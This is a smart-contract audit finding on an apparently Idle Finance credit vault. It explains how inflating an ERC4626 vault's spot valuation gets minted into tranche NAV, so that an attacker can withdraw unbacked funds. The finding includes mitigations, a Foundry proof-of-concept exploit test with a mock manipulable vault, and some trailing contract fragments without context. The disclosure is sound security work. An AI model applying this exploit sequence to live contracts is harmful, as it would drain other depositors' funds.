### Title
Spot ERC4626 price manipulation mints unbacked credit-vault withdrawals - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary

`ProgrammableBorrower` values its parked ERC4626 position with the vault’s instantaneous `convertToAssets` result and folds any positive delta into `totalInterestDueNow`. `IdleCDOEpochVariant.stopEpoch` treats that spot value as realized epoch yield and, in `isInterestMinted` mode, mints new `IdleCreditVault` strategy tokens without pulling cash from the borrower. A tranche holder who can manipulate a low-liquidity ERC4626 vault’s share price can therefore crystallize fake profit into tranche NAV, restore the price, request withdrawal at the inflated price, and have the fixed receipt funded from the vault’s real liquidity in the next epoch. [1](#0-0) [2](#0-1) 

### Finding Description

In programmable-borrower mode, `_resolveStopEpochInterest` uses `IProgrammableBorrower.totalInterestDueNow()` as the sole source of epoch interest. [3](#0-2) 

`totalInterestDueNow` computes vault PnL as:

```solidity
earnedAssets = convertToAssets(vaultShares) + epochWithdrawnFromVault;
principalAssets = epochStartVaultAssets + epochDepositedToVault;
interest = earnedAssets - principalAssets;
```

There is no TWAP, sanity bound, realized-redemption check, or verification that the reported value can actually be withdrawn. [4](#0-3) 

When `isInterestMinted` is enabled, `stopEpoch` sets `_amountToPullFromBorrower = 0` and mints strategy tokens for the full reported gross interest. This converts the transient external valuation into internal CDO NAV even though no additional underlying entered the credit vault. [5](#0-4) 

After the epoch stops, withdrawal requests are priced from the now-inflated tranche price. `requestWithdraw` fixes a receipt amount, burns the user’s tranche tokens, and adds that amount to `pendingWithdraws`. [6](#0-5)  The next successful `stopEpoch` then pulls and reserves the receipt amount through `collectWithdrawFunds`, while `claimWithdrawRequest` pays the receipt at par. [7](#0-6) [8](#0-7) 

Example with fees disabled:

1. Attacker deposits `1,000` AA and victim deposits `9,000` AA, so attacker owns 10% of the pool.
2. `startEpoch` sends `10,000` underlying to `ProgrammableBorrower`, which deposits it into the external ERC4626 vault.
3. During the running epoch, the attacker manipulates the external vault’s spot `convertToAssets` upward so the borrower’s position reports `20,000`.
4. The honest manager calls `stopEpoch(0, 0)`.
5. `totalInterestDueNow()` reports `10,000` fake vault interest.
6. Because `isInterestMinted` is true, the CDO mints `10,000` strategy tokens instead of requiring cash. Tranche NAV doubles to `20,000`.
7. The attacker restores the external vault price and calls `requestWithdraw` for all of their tranche tokens. Their `1,000` principal becomes a fixed `2,000` receipt.
8. After the next epoch, the programmable borrower withdraws `2,000` from the vault’s real `10,000` balance and reserves it for the attacker.
9. The attacker claims `2,000`, extracting `1,000` more than their fair claim.
10. The remaining strategy-token NAV still claims approximately `18,000`, while only `8,000` underlying remains.

The broken invariant is fair redemption and solvency: strategy-token claims are minted against a spot valuation that was neither cash-settled nor realizable.

### Impact Explanation

An attacker holding fraction `f` of tranche supply who can inflate the vault-reported position by `X` obtains approximately `f * X` of excess withdrawal basis. The excess is paid from real vault liquidity or borrower-funded withdrawal reserves, while the remaining LPs inherit the insolvency.

With `T = 10,000`, `f = 10%`, and `X = 10,000`, the attacker converts a `1,000` claim into a `2,000` receipt and directly steals `1,000` underlying. Larger price inflation creates correspondingly larger unbacked claims, bounded only by the attacker’s tranche ownership and the amount of real liquidity later available to fund pending receipts.

This is not merely a bad external-vault loss. The protocol converts a reversible spot-valuation spike into permanent internal NAV because minted strategy tokens continue to price tranches at one underlying each even after the external price reverts. [9](#0-8) 

### Likelihood Explanation

The attack requires all of the following:

- A programmable-borrower deployment.
- `isInterestMinted` enabled.
- The integrated ERC4626 vault has a manipulable spot valuation or low-liquidity price source.
- The attacker is an eligible tranche holder and can cause that valuation spike around `stopEpoch`.
- An honest manager subsequently calls `stopEpoch`.

No privileged malicious action is required. The manager’s normal `stopEpoch` call is sufficient, and KYC does not prevent an eligible lender from holding tranche tokens while manipulating the external vault.

Likelihood depends on the chosen ERC4626 integration. A cash-balance vault that cannot be priced above real recoverable assets is not vulnerable to this exact profit path. A vault whose `convertToAssets` depends on thin market prices, low-liquidity pools, or unrealized marks is vulnerable.

### Recommendation

Do not treat instantaneous ERC4626 valuation changes as settled pool yield.

Recommended mitigations:

- In minted-interest mode, only mint strategy tokens for realized vault gains. Redeem the required shares to underlying during `onStopEpoch`, or settle the vault-interest leg with an operator-fronted transfer before minting claims.
- Bound `totalInterestDueNow` by liquidity that can actually be withdrawn, using `maxWithdraw`/`previewRedeem` plus an explicit post-withdrawal balance check.
- If unrealized vault yield must remain supported, compare `convertToAssets` against a TWAP or a time-delayed valuation and reject deviations above a configured threshold.
- Reconcile the borrower’s actual underlying balance plus redeemed proceeds before updating `expectedEpochInterest`.
- Add an upper bound on per-epoch vault PnL relative to `epochStartVaultAssets`, so an anomalous spike cannot mint unlimited unbacked strategy tokens.

### Proof of Concept

The following Foundry PoC can be added to `test/foundry/ProgrammableBorrowerCreditVault.t.sol`. `SpotPriced4626` models an external ERC4626 vault whose public `convertToAssets` can be pushed through a low-liquidity spot price while its actual cash balance remains unchanged.

```solidity
contract SpotPriced4626 is ERC20 {
  IERC20Detailed public immutable assetToken;
  uint256 public reportedAssets;
  bool public pumped;

  constructor(address _asset) ERC20("Spot Vault", "SPOT") {
    assetToken = IERC20Detailed(_asset);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  // Stands in for a low-liquidity trade that doubles the vault's mark price.
  function pump(bool value) external {
    pumped = value;
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    if (supply == 0) return shares;
    uint256 markedAssets = pumped ? reportedAssets * 2 : reportedAssets;
    return shares * markedAssets / supply;
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 supply = totalSupply();
    shares = supply == 0 || reportedAssets == 0
      ? assets
      : assets * supply / reportedAssets;
    assetToken.transferFrom(msg.sender, address(this), assets);
    reportedAssets += assets;
    _mint(receiver, shares);
  }

  function withdraw(uint256 assets, address receiver, address owner)
    external
    returns (uint256 shares)
  {
    require(assetToken.balanceOf(address(this)) >= assets, "illiquid");
    shares = assets;
    _burn(owner, shares);
    reportedAssets -= assets;
    assetToken.transfer(receiver, assets);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    _burn(owner, shares);
    reportedAssets -= assets;
    assetToken.transfer(receiver, assets);
  }
}
```

The exploit sequence is:

```solidity
function testSpotVaultInflationCreatesUnbackedWithdrawalClaim() external {
  SpotPriced4626 spotVault = new SpotPriced4626(USDC);
  address attacker = makeAddr("attacker");
  address victim = makeAddr("victim");

  uint256 attackerDeposit = 1_000 * oneScale;
  uint256 victimDeposit = 9_000 * oneScale;

  vm.prank(manager);
  programmableBorrower.setVault(address(spotVault));

  vm.prank(owner);
  cdoEpoch.setIsInterestMinted(true);

  _depositWithUser(attacker, attackerDeposit, true);
  _depositWithUser(victim, victimDeposit, true);

  _startEpochAndCheckPrices(0);

  uint256 shares = spotVault.balanceOf(address(programmableBorrower));
  assertEq(spotVault.convertToAssets(shares), 10_000 * oneScale);

  // Attacker pushes the external vault's spot mark from 10k to 20k.
  spotVault.pump(true);

  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpoch(0, 0);

  // The fake 10k vault gain has now been crystallized as 10k strategy tokens.
  assertEq(cdoEpoch.lastEpochInterest(), 10_000 * oneScale);
  assertGt(
    cdoEpoch.virtualPrice(address(aaTranche)),
    19e17,
    "spot inflation did not double AA price"
  );

  // Restore the external mark. Internal NAV remains inflated.
  spotVault.pump(false);

  uint256 attackerTrancheBalance = aaTranche.balanceOf(attacker);
  vm.prank(attacker);
  uint256 receipt = cdoEpoch.requestWithdraw(attackerTrancheBalance, address(aaTranche));

  assertEq(receipt, 2_000 * oneScale, "inflated receipt");
  assertEq(strategy.pendingWithdraws(), receipt);

  _startEpochAndCheckPrices(1);
  vm.warp(cdoEpoch.epochEndDate() + 1);

  vm.prank(manager);
  cdoEpoch.stopEpoch(0, 0);

  uint256 attackerBalanceBefore = underlying.balanceOf(attacker);
  vm.prank(attacker);
  cdoEpoch.claimWithdrawRequest();

  assertEq(
    underlying.balanceOf(attacker) - attackerBalanceBefore,
    2_000 * oneScale,
    "attacker was not paid inflated receipt"
  );

  // Attacker deposited 1k and received 2k.
  assertEq(
    underlying.balanceOf(attacker),
    attackerDeposit * 2,
    "attacker did not double deposit"
  );

  // Only 8k real vault assets remain for roughly 18k of residual claims.
  assertEq(USDC.balanceOf(address(spotVault)), 8_000 * oneScale);
  assertApproxEqAbs(cdoEpoch.getContractValue(), 18_000 * oneScale, 2);
}
```

The important behavior is that the attack does not require withdrawing at the inflated external-vault price. `isInterestMinted` causes the fake valuation to be minted into internal strategy-token NAV first; withdrawal happens later against real vault liquidity.

    if (netDelta > 0) {
      interest = uint256(netDelta);

    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
